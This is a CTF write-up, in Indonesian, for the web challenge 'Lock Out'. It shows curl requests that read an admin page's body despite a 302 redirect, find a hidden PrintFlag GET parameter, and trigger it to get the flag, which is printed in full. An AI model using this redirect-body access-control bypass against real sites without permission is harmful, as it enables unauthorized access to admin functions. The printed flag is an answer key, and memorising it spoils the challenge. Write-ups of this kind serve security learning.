# Writeup CTF - Lock Out

## Informasi Challenge

- **Judul:** Lock Out
- **Kategori:** Web
- **Deskripsi:**

> I seem to have locked myself out of my admin panel!  
> Can you find a way back in for me?

- **Target:**

```text
http://b018.chall.kali-team.online:8001/
```

---

# Analisis

Challenge ini menguji pemahaman mengenai **akses kontrol yang tidak diterapkan dengan benar**. Meskipun halaman admin mengembalikan status **HTTP 302 Redirect** menuju halaman login, server tetap mengirimkan isi halaman admin pada body respons.

Akibatnya, informasi sensitif yang seharusnya hanya dapat diakses setelah autentikasi tetap dapat dibaca oleh pengguna yang belum login.

---

# Langkah Penyelesaian

## 1. Cek halaman utama

Akses halaman utama menggunakan `curl`:

```bash
curl http://b018.chall.kali-team.online:8001/
```

Halaman hanya menampilkan daftar posting publik beserta tautan menuju halaman login.

---

## 2. Analisis halaman login

Form login mengirimkan kredensial ke `admin.php`.

```html
<form action="admin.php" method="post">
    <input type="text" name="username" required>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
</form>
```

Hal ini menunjukkan bahwa seluruh logika autentikasi berada pada `admin.php`.

---

## 3. Akses langsung `admin.php`

Coba akses halaman admin tanpa login.

```bash
curl -i http://b018.chall.kali-team.online:8001/admin.php
```

Server mengembalikan:

```http
HTTP/1.1 302 Found
Location: login.php
```

Sekilas terlihat aman karena pengguna diarahkan kembali ke halaman login.

Namun setelah memeriksa **body** respons, ternyata seluruh HTML dashboard admin tetap dikirim oleh server.

Di dalam HTML tersebut terdapat form tersembunyi berikut:

```html
<form action="admin.php" method="get" class="action-form">
    <input type="submit" name="PrintFlag" value="Execute: Get_Flag.sh">
</form>
```

Temuan ini menunjukkan bahwa dashboard memiliki aksi yang dapat dijalankan menggunakan parameter GET `PrintFlag`.

---

## 4. Jalankan aksi tersembunyi

Karena parameter yang dibutuhkan sudah diketahui, kirim request langsung ke endpoint tersebut.

```bash
curl -i "http://b018.chall.kali-team.online:8001/admin.php?PrintFlag=Execute%3A+Get_Flag.sh"
```

Walaupun server masih mengembalikan status **302 Redirect**, body respons kini berisi flag.

```html
<div class='flag-container'>
    <span>[SYSTEM_NOTIFICATION]: FLAG_RECOVERED</span>
    <p class='flag'>KaliTeam{27ad1009-72d7-4d8b-9245-b455a70337e5}</p>
</div>
```

---

# Flag

```text
KaliTeam{27ad1009-72d7-4d8b-9245-b455a70337e5}
```

---

